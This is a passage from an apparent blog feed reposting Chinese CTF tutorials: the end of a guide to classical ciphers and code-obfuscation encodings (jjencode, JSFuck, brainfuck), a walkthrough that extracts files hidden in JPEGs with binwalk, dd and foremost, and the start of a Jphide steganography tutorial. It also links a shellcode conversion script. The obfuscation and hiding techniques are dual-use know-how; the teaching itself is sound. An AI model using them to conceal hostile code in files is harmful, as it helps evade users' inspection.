<p>明文：<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p>
<p>(类似)摩尔斯电码:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-x....x.xx--.-x..-x..x-.-.x-.-xx-...x.-.x---x.--x-.xx..-.x---x-..-xx.---x..- --x.--.x...xx---x...-x.x.-.xx-x....x.xx.-..x.-x--..x-.--xx-..x---x--.</div></pre></td></tr></table></figure>
<p>说明:明文在转换为(类似)摩尔斯电码后进行每3个字符分组，再进行密表的查表。</p>
<p>密文(经过密表替换):<code>LMUWC OQVHG ZMTAK EVYSW NOYJQ NLIQB JQCDH XMDYF TWRGP FWNH</code></p>
<p>已知密钥在线加解密<a href="http://ruffnekk.stormloader.com/fractmorse_tool.html" target="_blank" rel="external">传送门</a></p>
<hr>
<h4 id="25-Bazeries密码"><a href="#25-Bazeries密码" class="headerlink" title="25.Bazeries密码"></a>25.Bazeries密码</h4><p>Bazeries密码(Bazeries Cipher)是换位密码和替换密码的组合，使用两个波利比奥斯方阵，一个明文字母方阵，使用一个随机的数字(一般小于1000000)的生成一个密钥矩阵同时作为第一轮明文划分分组，比如2333这个数字翻译为英文便是TWO THOUSAND THREE HUNDRED THIRTY THREE,从第一个字母T开始选取不重复的字母，之后再从字母表中按序选取没有出现的字母组成密钥矩阵。</p>
<p>明文:<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p>
<p>随机数字:<code>2333</code></p>
<p>明文矩阵:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">A  F  L  Q  V</div><div class="line">B  G  M  R  W</div><div class="line">C  H  N  S  X</div><div class="line">D I/J O  T  Y</div><div class="line">E  K  P  U  Z</div></pre></td></tr></table></figure>
<p>示例密钥矩阵:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">T  W  O  H  U</div><div class="line">S  A  N  D  R</div><div class="line">E I/J Y  B  C</div><div class="line">F  G  K  L  M</div><div class="line">P  Q  V  X  Z</div></pre></td></tr></table></figure>
<p>明文分组:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">2   3   3   3   2   3   3   3  2   3   3  3</div><div class="line">TH EQU ICK BRO WN FOX JUM PSO VE RTH ELA ZYD OG</div></pre></td></tr></table></figure>
<p>分组明文反序:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">HT UQE KCI ORB WN XOF MUJ OSP EV EHT ALE DYZ GO</div></pre></td></tr></table></figure>
<p>使用密钥矩阵替换:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">IL XHP QEG KDS YR CKW NXG KBV PU ILD TOP FMZ AK</div></pre></td></tr></table></figure>
<p>(比如’H’在明文矩阵对应到密钥矩阵的位置就是’I’）</p>
<p>已知密钥在线加解密<a href="http://ruffnekk.stormloader.com/bazeries_tool.html" target="_blank" rel="external">传送门</a></p>
<hr>
<h4 id="26-Digrafid密码"><a href="#26-Digrafid密码" class="headerlink" title="26.Digrafid密码"></a>26.Digrafid密码</h4><p>Digrafid密码(Digrafid Cipher)使用两个密钥生成分别生成类似波利比奥斯方阵的3x9方格的密表。，主要有3分组和4分组两类。</p>
<p>第一个方阵密钥:<code>digrafid</code></p>
<p>第二个方阵密钥:<code>cipher</code></p>
<p>密表：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">1 2 3 4 5 6 7 8 9</div><div class="line">D I G R A F D B C 1 2 3</div><div class="line">E H J L M N O P Q 4 5 6</div><div class="line">S T U V W X Y Z # 7 8 9</div><div class="line">                  c f s 1</div><div class="line">                  i g t 2</div><div class="line">                  p j u 3</div><div class="line">                  h k v 4</div><div class="line">                  e l w 5</div><div class="line">                  r m x 6</div><div class="line">                  a n y 7</div><div class="line">                  b o z 8</div><div class="line">                  d q # 9</div></pre></td></tr></table></figure>
<p>明文:<code>THE QUICK BROWN FOX</code></p>
<p>密表转换(以4分组为例):</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Th Eq Ui Ck   Br Ow Nf Ox</div><div class="line">2  1  3  9    8  7  6  7</div><div class="line">7  5  7  2    1  6  5  6</div><div class="line">4  9  2  4    6  5  1  6</div></pre></td></tr></table></figure>
<p>说明:T在第一矩阵第2列，h在第二矩阵第4行，T所在的行与h所在的列相交的位置数字为7，所以Th表示为274。</p>
<p>转换密文:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">213 975 724 924   876 716 566 516</div><div class="line">Ip  #e  Dk  Ck    Zr  Dr  Mx  Ar</div></pre></td></tr></table></figure>
<hr>
<p>####27.格朗普雷密码####</p>
<p>格朗普雷密码(Grandpré Cipher)是替换密码的一种，一般使用8个8字母的单词横向填充8x8方阵，且第一列为一个单词，并且在方阵中26个字母都必须出现一次以上。</p>
<p>示例密阵:</p>
<p>![格朗普雷密码.jpg][48]</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">明文:T  H  E  Q  U  I  C  K  B  R  O  W  N  F  O </div><div class="line">密文:84 27 82 41 51 66 31 36 15 71 67 73 52 34 67</div></pre></td></tr></table></figure>
<p>说明：明文中的字母在密阵位置可能不止一个，所以加密结果可能有多种，但是不影响解密。密阵还有6x6，7x7，9x9,10x10几种。显然密阵越大每个字母被替换的情况就可能越多，那么加密效果就更好。</p>
<hr>
<h4 id="28-比尔密码"><a href="#28-比尔密码" class="headerlink" title="28.比尔密码"></a>28.比尔密码</h4><p>比尔密码(Beale ciphers)有三份密码，当然这里说的是已被破解第二份，是一种类似书密码的替换密码。</p>
<p>![比尔密码.png][49]</p>
<p>以第二密码为例，每一个数字代表美国《独立宣言》的文本中的第几个词的首字母，如1代表第1个词的首字母“w”，2代表第2个词首字母“i”。解密后的文字如下：</p>
<p>I have deposited in the county of Bedford…</p>
<p>比尔密码还有一段有趣的故事，感兴趣可以看一下比尔密码的<a href="https://zh.wikipedia.org/wiki/%E6%AF%94%E5%B0%94%E5%AF%86%E7%A0%81" target="_blank" rel="external">详细介绍</a>。</p>
<h4 id="29-键盘密码"><a href="#29-键盘密码" class="headerlink" title="29.键盘密码"></a>29.键盘密码</h4><p>一般用到的键盘密码就是手机键盘和电脑键盘两种，2014 0ctf比赛里Crypto类型中Classic一题就是电脑键盘密码，详细可以<a href="http://www.programlife.net/0ops-ctf-writeup.html" target="_blank" rel="external">参考</a>，另外给出另外一些<a href="http://www.secbox.cn/hacker/ctf/8078.html" target="_blank" rel="external">参考</a>情况。</p>
<h3 id="其他有趣的机械密码"><a href="#其他有趣的机械密码" class="headerlink" title="其他有趣的机械密码"></a>其他有趣的机械密码</h3><hr>
<h4 id="1-恩尼格玛密码"><a href="#1-恩尼格玛密码" class="headerlink" title="1.恩尼格玛密码"></a>1.恩尼格玛密码</h4><p>恩尼格玛密码机（德语：Enigma，又译哑谜机，或“谜”式密码机）是一种用于加密与解密文件的密码机。确切地说，恩尼格玛是对二战时期纳粹德国使用的一系列相似的转子机械加解密机器的统称，它包括了许多不同的型号，为密码学对称加密算法的流加密。详细工作原理参考<a href="https://zh.wikipedia.org/wiki/%E6%81%A9%E5%B0%BC%E6%A0%BC%E7%8E%9B%E5%AF%86%E7%A0%81%E6%9C%BA" target="_blank" rel="external">维基百科</a>。</p>
<p>![恩尼格玛密码.jpg][50]</p>
<p>在线模拟<a href="http://enigmaco.de/enigma/enigma.html" target="_blank" rel="external">传送门</a></p>
<p>感兴趣可以观看<a href="http://list.youku.com/albumlist/show?id=23400097&amp;ascending=1&amp;page=1" target="_blank" rel="external">播单:计算机历史文化课</a></p>
<hr>
<h3 id="代码混淆加密"><a href="#代码混淆加密" class="headerlink" title="代码混淆加密"></a>代码混淆加密</h3><p>1.<a href="http://www.zhaoyuanma.com/aspfix.html" target="_blank" rel="external">asp混淆加密</a></p>
<p>2.<a href="http://www.zhaoyuanma.com/phpjmvip.html" target="_blank" rel="external">php混淆加密</a></p>
<p>3.<a href="http://tool.css-js.com/" target="_blank" rel="external">css/js混淆加密</a></p>
<p>4.<a href="http://www.zhaoyuanma.com/aspfix.html" target="_blank" rel="external">VBScript.Encode混淆加密</a></p>
<hr>
<h4 id="5-ppencode"><a href="#5-ppencode" class="headerlink" title="5.ppencode"></a>5.ppencode</h4><p>ppencode-Perl把Perl代码转换成只有英文字母的字符串。</p>
<p>![ppencode.png][51]</p>
<p>ppencode<a href="http://namazu.org/~takesako/ppencode/demo.html" target="_blank" rel="external">传送门</a></p>
<hr>
<h4 id="6-rrencode"><a href="#6-rrencode" class="headerlink" title="6.rrencode"></a>6.rrencode</h4><p>rrencode可以把ruby代码全部转换成符号。</p>
<p>![rrencode.jpg][52]</p>
<p>rrencode<a href="http://www.lab2.kuis.kyoto-u.ac.jp/~yyoshida/rrencode.html" target="_blank" rel="external">传送门</a></p>
<hr>
<h4 id="7-jjencode-aaencode"><a href="#7-jjencode-aaencode" class="headerlink" title="7.jjencode/aaencode"></a>7.jjencode/aaencode</h4><p>jjencode将JS代码转换成只有符号的字符串，类似于rrencode，介绍的<a href="http://utf-8.jp/public/20090710/jjencode.pps" target="_blank" rel="external">PPT</a>，aaencode可以将JS代码转换成常用的网络表情，也就是我们说的颜文字js加密。</p>
<p>![aaencode.png][53]</p>
<p>aaencode<a href="http://utf-8.jp/public/aaencode.html" target="_blank" rel="external">传送门</a></p>
<p>jjencode/aaencode的解密直接在浏览器的控制台里输入密文即可执行解密，想要详细了解jjencode是如何进行请<a href="http://pferrie2.tripod.com/papers/jjencode.pdf" target="_blank" rel="external">参考</a>，你也可以在github上<a href="https://github.com/jacobsoo/Decoder-JJEncode" target="_blank" rel="external">下载</a>实现jjdecoder的源码进行分析。</p>
<p>![aaencode解密.png][54]</p>
<hr>
<h4 id="8-JSfuck"><a href="#8-JSfuck" class="headerlink" title="8.JSfuck"></a>8.JSfuck</h4><p>JSFuck 可以让你只用 6 个字符<code>[ ]( ) ! +</code>来编写 JavaScript 程序。</p>
<p>![JSfuck.png][55]</p>
<p>JSfuck<a href="http://www.jsfuck.com/" target="_blank" rel="external">传送门</a></p>
<hr>
<h4 id="9-jother"><a href="#9-jother" class="headerlink" title="9.jother"></a>9.jother</h4><p>jother是一种运用于javascript语言中利用少量字符构造精简的匿名函数方法对于字符串进行的编码方式。其中8个少量字符包括：<code>! + ( ) [ ] { }</code>。只用这些字符就能完成对任意字符串的编码。</p>
<p><a href="http://drops.wooyun.org/author/do9gy" target="_blank" rel="external">do9gy</a>的<a href="http://drops.wooyun.org/web/4410" target="_blank" rel="external">jother编码之谜</a></p>
<p>![jother.png][56]</p>
<p>jother编码<a href="http://tmxk.org/jother/" target="_blank" rel="external">传送门</a></p>
<p>jother直接在浏览器(IE可以)的控制台里输入密文即可执行解密：</p>
<p>![jother解密.png][57]</p>
<hr>
<h3 id="10-brainfuck"><a href="#10-brainfuck" class="headerlink" title="10.brainfuck"></a>10.brainfuck</h3><p>Brainfuck是一种极小化的计算机语言，按照”Turing complete（完整图灵机）”思想设计的语言，它的主要设计思路是：用最小的概念实现一种“简单”的语言，BrainF**k 语言只有八种符号，所有的操作都由这八种符号(<code>&amp;gt; &amp;lt; + - . , [ ]</code>)的组合来完成。</p>
<p>明文：hello!</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++++ .---. +++++ ++..+ ++.&lt;+ +++++ +++++</div><div class="line">[-&gt;++ +++++ ++++&lt; ]&gt;+++ ++++. &lt;++++ +++[- &gt;---- ---&lt;] &gt;--.&lt; +++++ ++[-&gt;</div><div class="line">----- --&lt;]&gt; ----- ----- .&lt;</div></pre></td></tr></table></figure>
<p>brainfuck<a href="http://www.splitbrain.org/services/ook" target="_blank" rel="external">传送门</a></p>
<p>其他稀奇古怪的编程语言请<a href="http://news.mydrivers.com/1/190/190926.htm" target="_blank" rel="external">参考</a></p>
<h3 id="相关工具"><a href="#相关工具" class="headerlink" title="相关工具"></a>相关工具</h3><hr>
<p><a href="http://www.wechall.net/applet/JPK_406.jar" target="_blank" rel="external">JPK神器</a></p>
<p><a href="https://github.com/jameslyons/python_cryptanalysis" target="_blank" rel="external">密码破解脚本</a></p>
<p><a href="https://dl.packetstormsecurity.net/shellcode/shellcodeencdec.py.txt" target="_blank" rel="external">shellcode转换脚本</a></p>
<h3 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h3><hr>
<p><a href="https://en.wikipedia.org/wiki/Classical_cipher" target="_blank" rel="external">Wikipedia Classical Cipher</a></p>
<p><a href="http://cryptogram.org/cipher_types.html" target="_blank" rel="external">Cryptogram Cipher Types</a></p>
<p><a href="http://www.practicalcryptography.com/" target="_blank" rel="external">Practical Cryptography</a></p>
<p><a href="http://rumkin.com/tools/cipher/" target="_blank" rel="external">Rumkin Cipher Tools</a></p>
<p><a href="https://encode-decode.appspot.com/" target="_blank" rel="external">encode-decode</a></p>
<p><a href="https://www.hackfun.org/" target="_blank" rel="external">4ido10n Blog</a></p>
<p><a href="http://wordsmith.org/anagram/" target="_blank" rel="external">Anagram</a></p>
<p></p><p><a href="http://www.thonky.com/kryptos/" target="_blank" rel="external">Thonky</a></p>
<ul>
<li>转载自<a href="https://www.hackfun.org/" target="_blank" rel="external">4ido10n’s Blog</a>文章<a href="https://www.hackfun.org/CTF/coding-and-encryption-of-those-brain-holes-in-CTF.html" target="_blank" rel="external">《CTF中那些脑洞大开的编码和加密》</a></li>
</ul>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[CTF中图片隐藏文件分离方法总结]]></title>
      <url>http://uknowsec.cn/posts/ctf/CTF%E4%B8%AD%E5%9B%BE%E7%89%87%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6%E5%88%86%E7%A6%BB%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93.html</url>
      <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h1 id="CTF中图片隐藏文件分离方法总结"><a href="#CTF中图片隐藏文件分离方法总结" class="headerlink" title="CTF中图片隐藏文件分离方法总结"></a>CTF中图片隐藏文件分离方法总结</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在安全的大趋势下，信息安全越来越来受到国家和企业的重视，所以CTF比赛场次越来越多，而且比赛形式也不断的创新，题目也更加新颖有趣，对选手的综合信息安全能力有一个较好的考验，当然更好的是能从比赛有所收获，不断学习和总结提升自己的信息安全能力与技术。转到CTF比赛上，通常在CTF比赛中常有与隐写术(Steganography)相关的题目出现，这里我们讨论总结图片隐藏文件分离的方法，欢迎大家补充和交流:P</p>
<h2 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h2><p>这里我们以图片为载体，给了这样的一样图片：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/1574897276.jpg" alt="CTF中图片隐藏文件分离方法总结"></p>
<p>首先我们需要对图片进行分析，这里我们需要用到一个工具<a href="https://github.com/devttys0/binwalk" target="_blank" rel="external">binwalk</a>，想要了解这个工具可以参考这篇<a href="http://www.freebuf.com/sectool/15266.html" target="_blank" rel="external">Binwalk：后门（固件）分析利器</a>文章，以及<a href="http://tools.kali.org/forensics/binwalk" target="_blank" rel="external">kali官方对binwalk的概述和使用介绍</a>。</p>
<p>这里我们就是最简单的利用，在binwalk后直接提供固件文件路径和文件名即可:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># binwalk carter.jpg</div></pre></td></tr></table></figure></p>
<p>当我们使用这行命令后，binwalk就会自动分析这个jpg文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"># binwalk carter.jpg</div><div class="line">  </div><div class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</div><div class="line">--------------------------------------------------------------------------------</div><div class="line">0             0x0             JPEG image data, JFIF standard 1.01</div><div class="line">382           0x17E           Copyright string: &quot;Copyright (c) 1998 Hewlett-Packard Company&quot;</div><div class="line">3192          0xC78           TIFF image data, big-endian, offset of first image directory: 8</div><div class="line">140147        0x22373         JPEG image data, JFIF standard 1.01</div><div class="line">140177        0x22391         TIFF image data, big-endian, offset of first image directory: 8</div></pre></td></tr></table></figure>
<p>从上面的内容显然看得出来这个jpg文件还隐藏着另一个jpg文件，从140147块偏移开始就是另一张jpg。</p>
<h2 id="0x02-分离"><a href="#0x02-分离" class="headerlink" title="0x02 分离"></a>0x02 分离</h2><p>在得到隐藏信息之后我们下一步就是把另一张jpg分离出，以下讨论几种方法：</p>
<p><strong>（1）使用dd命令分离(linux/unix下)</strong></p>
<p>我们可以使用dd命令分离出隐藏文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># dd if=carter.jpg of=carter-1.jpg skip=140147 bs=1</div></pre></td></tr></table></figure>
<p>可以参考<a href="http://www.cnblogs.com/qq78292959/archive/2012/02/23/2364760.html" target="_blank" rel="external">dd命令详解</a>，这里if是指定输入文件，of是指定输出文件，skip是指定从输入文件开头跳过140147个块后再开始复制，bs设置每次读写块的大小为1字节 。</p>
<p>最后我们可以得到这样的一张carter-1.jpg图片：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/1035901972.jpg" alt="CTF中图片隐藏文件分离方法总结"></p>
<p><strong>（2）使用foremost工具分离</strong></p>
<p>foremost是一个基于文件文件头和尾部信息以及文件的内建数据结构恢复文件的命令行工具，win可以下载地址，Linux可以</p>
<p>通过下面命令安装使用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># apt-get install foremost</div></pre></td></tr></table></figure>
<p>安装foremost后你可以使用foremost -help查看使用帮助，这里最简单分离文件的命令为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># foremost carter.jpg</div></pre></td></tr></table></figure>
<p>当我们使用这行命令后，foremost会自动生成output目录存放分离出文件：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/462577935.png" alt="CTF中图片隐藏文件分离方法总结"></p>
<p><strong>（3）hex编辑器分析文件</strong></p>
<p>至于hex编辑器有很多，win下有用得较多的winhex,UltraEdit等，linux下有hexeditor等，这里我们以winhex为例手动分离，在分离之前我们需要知道一点关于jpg文件格式的知识，jpg格式文件开始的2字节是图像开始SOI(Start of Image,SOI)为FF D8，之后2个字节是JFIF应用数据块APPO(JFIF application segment)为FF E0 ，最后2个字节是图像文件结束标记EOI(end-of-file)为FF D9 ，如果你想详细了解更多关于这方面的知识可以参考<a href="http://blog.csdn.net/liuqz2009/article/details/8270355" target="_blank" rel="external">jpg文件格式分析</a>一文。</p>
<p>用winhex打开图片，通过Alt+G快捷键输入偏移地址22373跳转到另一张jpg的图像开始块，可以看到FF D8图像开始块。</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/468017981.png" alt="CTF中图片隐藏文件分离方法总结"></p>
<p>而图像结束块FF D9</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/1634850613.png" alt="CTF中图片隐藏文件分离方法总结"></p>
<p>选取使用Alt+1快捷键选取FF为开始的块，Alt+2选取D9为结束块，然后右键-&gt;Edit-&gt;Copy Block-&gt;Into New File保存相应的文件后缀，例如new.jpg</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/2866727204.png" alt="CTF中图片隐藏文件分离方法总结"></p>
<h2 id="0x03-其他"><a href="#0x03-其他" class="headerlink" title="0x03 其他"></a>0x03 其他</h2><p>还有一种特例，它是事先制作一个hide.zip，里面放入隐藏的文件，再需要一张jpg图片example.jpg，然后再通过命令 copy /b example.jpg+hide.zip output.jpg生成output.jpg的新文件，原理是利用了copy命令，将两个文件以二进制方式连接起来，正常的jpg文件结束标志是FF D9，而图片查看器会忽视jpg结束符之后的内容，所以我们附加的hide.zip就不会影响到图像的正常显示。(参考AppLeU0的<a href="http://drops.wooyun.org/tips/4862" target="_blank" rel="external">隐形术总结</a>)</p>
<p>针对这种特例我们可以直接将jpg文件改为zip文件后缀(其他文件如rar文件也类似)，就可以看到hide.zip压缩包里隐藏的文件。</p>
<p>比如当我们得到一张wh3r3_is_f14g.jpg文件：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/3019396614.jpg" alt="CTF中图片隐藏文件分离方法总结"></p>
<p>当我们用winhex打开文件，发现wh3r3_is_f14g.jpg文件最后数据块不是FF D9 jpg文件的结束标志，而是zip文件的结束标志。</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/857085314.png" alt="CTF中图片隐藏文件分离方法总结"></p>
<p>我们直接将文件改名为wh3r3_is_f14g.zip，打开得到flag.txt。</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/1649307525.png" alt="CTF中图片隐藏文件分离方法总结"></p>
<p>最后打开flag.txt得到flag。</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/4207904990.jpg" alt="CTF中图片隐藏文件分离方法总结"></p>
<h2 id="0x03-后话"><a href="#0x03-后话" class="headerlink" title="0x03 后话"></a>0x03 后话</h2><p>图片隐写方式有很多种，在此只介绍了这一种，如果以后有机会会写其他的图片隐写，如果对隐写感兴趣这里推荐一本机械工业出版社的《数据隐藏技术揭秘：破解多媒体、操作系统、移动设备和网络协议中的隐秘数据》，如果你不想购买实体书，可以<a href="http://www.jb51.net/books/434273.html" target="_blank" rel="external">下载pdf版</a>。</p>
<p>这里我把所有图片打包了zip，如果有需要自行下载吧: P</p>
<p></p><p><a href="https://www.hackfun.org/usr/uploads/2016/07/3701056190.zip" target="_blank" rel="external">Steganography_Pictures.zip</a></p>
<ul>
<li>转载自<a href="https://www.hackfun.org/" target="_blank" rel="external">4ido10n’s Blog</a>文章<a href="https://www.hackfun.org/CTF/summary-of-image-hiding-files-in-CTF.html" target="_blank" rel="external">《CTF中图片隐藏文件分离方法总结》</a></li>
</ul>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[深入理解JPEG图像格式Jphide隐写]]></title>
      <url>http://uknowsec.cn/posts/ctf/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JPEG%E5%9B%BE%E5%83%8F%E6%A0%BC%E5%BC%8FJphide%E9%9A%90%E5%86%99.html</url>
      <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h1 id="深入理解JPEG图像格式Jphide隐写"><a href="#深入理解JPEG图像格式Jphide隐写" class="headerlink" title="深入理解JPEG图像格式Jphide隐写"></a>深入理解JPEG图像格式Jphide隐写</h1><h2 id="0x00-隐写原理"><a href="#0x00-隐写原理" class="headerlink" title="0x00 隐写原理"></a>0x00 隐写原理</h2><p>Jphide是基于最低有效位LSB的<a href="http://www.cnblogs.com/leaven/archive/2010/04/06/1705846.html" target="_blank" rel="external">JPEG格式</a>图像隐写算法，使用JPEG图像作为载体是因为相比其他图像格式更不容易发现隐藏信息，因为JPEG图像在<a href="https://en.wikipedia.org/wiki/Discrete_cosine_transform" target="_blank" rel="external">DCT变换域</a>上进行隐藏比空间域隐藏更难检测，并且鲁棒性更强，同时<a href="http://baike.baidu.com/link?url=OWM-kQRYlFaJ2Sy7m1E_Z_-fnvknJTRSHwk1f3eoabLsbht1TJa07GmvWRoiOg6U7-0-Ey3vb_UHcDm9Pc7Mgq" target="_blank" rel="external">Blowfish算法</a>有较强的抗统计检测能力。</p>
<p>由于JPEG图像格式使用<a href="http://baike.baidu.com/view/391624.htm?fr=aladdin&amp;fromtitle=DCT&amp;fromid=4184&amp;type=syn" title="DCT&amp;fromid=4184&amp;type=syn" target="_blank" rel="external">离散余弦变换</a>（Discrete Cosine Transform，DCT）函数来压缩图像，而这个图像压缩方法的核心是：通过识别每个8×8像素块中相邻像素中的重复像素来减少显示图像所需的位数，并使用近似估算法降低其冗余度。因此，我们可以把DCT看作一个用于执行压缩的近似计算方法。因为丢失了部分数据，所以DCT是一种<a href="http://baike.baidu.com/link?url=7eIl--nFUaz-amKaY9jatpW4J-J2JyZEXy8dYJM4Py1CspzR9mUATKgTyXOCt7M6AjFSv4JmF3YKtXTTAauHm_" target="_blank" rel="external">有损压缩</a>（Loss Compression）技术，但一般不会影响图像的视觉效果。</p>
<h2 id="0x01-隐写过程"><a href="#0x01-隐写过程" class="headerlink" title="0x01 隐写过程"></a>0x01 隐写过程</h2><p>Jphide隐写过程大致为：先解压压缩JPEG图像，得到DCT系数；然后对隐藏信息用户给定的密码进行Blowfish加密；再利用Blowfish算法生成伪随机序列，并据此找到需要改变的DCT系数，将其末位变为需要隐藏的信息的值。最后把DCT系数重新压回成JPEG图片，下面是个人对隐写过程理解画出的大致流程图。</p>
<p><img src="http://i.imgur.com/kb6USbH.png" alt=""></p>
<!--more-->
<h2 id="0x02-隐写实现"><a href="#0x02-隐写实现" class="headerlink" title="0x02 隐写实现"></a>0x02 隐写实现</h2><p><strong>（1）Stegdetect</strong></p>
<p>实现JPEG图像Jphide隐写算法工具有多个，比如由Neils Provos开发通过统计分析技术评估JPEG文件的DCT频率系数的隐写工具<a href="https://github.com/abeluck/stegdetect" target="_blank" rel="external">Stegdetect</a>，它可以检测到通过JSteg、JPHide、OutGuess、Invisible Secrets、F5、appendX和Camouflage等这些隐写工具隐藏的信息，并且还具有基于字典暴力破解密码方法提取通过Jphide、outguess和jsteg-shell方式嵌入的隐藏信息。</p>
<p><strong>（2）JPHS</strong></p>
<p>而这里介绍另一款JPEG图像的信息隐藏软件<a href="http://io.acad.athabascau.ca/~grizzlie/Comp607/programs.htm" target="_blank" rel="external">JPHS</a>，它是由Allan Latham开发设计实现在Windows和Linux系统平台针对有损压缩JPEG文件进行信息加密隐藏和探测提取的工具。软件里面主要包含了两个程序JPHIDE和JPSEEK， JPHIDE程序主要是实现将信息文件加密隐藏到JPEG图像功能，而JPSEEK程序主要实现从用JPHIDE程序加密隐藏得到的JPEG图像探测提取信息文件，Windows版本的JPHS里的JPHSWIN程序具有图形化操作界面且具备JPHIDE和JPSEEK的功能。</p>
<p><img src="http://i.imgur.com/BzbsFlS.png" alt=""></p>
<p>1.Windows用户请下载<a href="http://io.acad.athabascau.ca/~grizzlie/Comp607/jphs05.zip" target="_blank" rel="external">JPHS-05 for Windows</a>,同时也提供下载<a href="http://linux01.gwdg.de/~alatham/stego.html" target="_blank" rel="external">Linux版本</a>。</p>
<p>2.分别准备一个JPEG格式的图片（example.jpg）和一个文本文件（flag.txt）。</p>
<p><img src="http://i.imgur.com/C8DQKFo.png" alt=""></p>
<p>由于JPEG文件使用的数据存储方式有多种不能一一演示，这里用最常用的JPEG格式-JPEG文件交换格式（JPEG File Interchange Format，JFIF）作为示例。</p>
<p>这里简单介绍JPEG文件交换格式的JPEG图片的图像开始标记SOI（Start of Image）和应用程序保留标记APP0（Application 0），JPEG文件交换格式的JPEG图片开始前2个字节是图像开始标记为0xFFD8，之后2个字节接着便是应用程序保留标记为0xFFE0，应用程序保留标记APP0包含9个具体字段，这里介绍前三个字段，第一个字段是数据长度占2个字节，表示包括本字段但不包括标记代码的总长度，这里为10个字节，第二个字段是标识符占5个字节0x4A46494600表示“JFIF0”字符串，第三个字段是版本号占2个字节，这里是0X0101，表示JFIF的版本号为1.1，但也可能为其它数值，从而代表了其它版本号。</p>
<p><img src="http://i.imgur.com/ciEvX2s.png" alt=""></p>
<p>3.Windows版本可以使用具有图形化操作界面的Jphswin，选择“Open jpeg”打开示例JPEG格式图片example.jpg</p>
<p><img src="http://i.imgur.com/kipH6L0.png" alt=""></p>
<p>如果你选择的不是JPEG格式的图片程序会自动退出，你可以16进制编辑器如Winhex查看图片的图像开始标记SOI和应用程序保留标记APP0，当载入JPEG格式图片会显示一些图片的属性。</p>
<p><img src="http://i.imgur.com/ImK54U1.png" alt=""></p>
<p>4.选择“Hide”选项之后在两次文本框输入相同的密码，这里以输入flag作为密码为例，然后输入要包含隐藏信息的文本。</p>
<p><img src="http://i.imgur.com/QYrSVtE.png" alt=""></p>
<p>5.选择将要隐藏的信息如flag.txt。</p>
<p><img src="http://i.imgur.com/XfbEvQS.png" alt=""></p>
<p>6.选择“Save jpeg as”选项将图片另存为jpeg格式并输入文件的名称为新的图像文件如C4n-u-find-f14g.jpg。</p>
<p><img src="http://i.imgur.com/sj8X3aP.png" alt=""></p>
<p>7.之后便可以看到生成结果和相关信息。</p>
<p><img src="http://i.imgur.com/HPkvnci.png" alt=""></p>
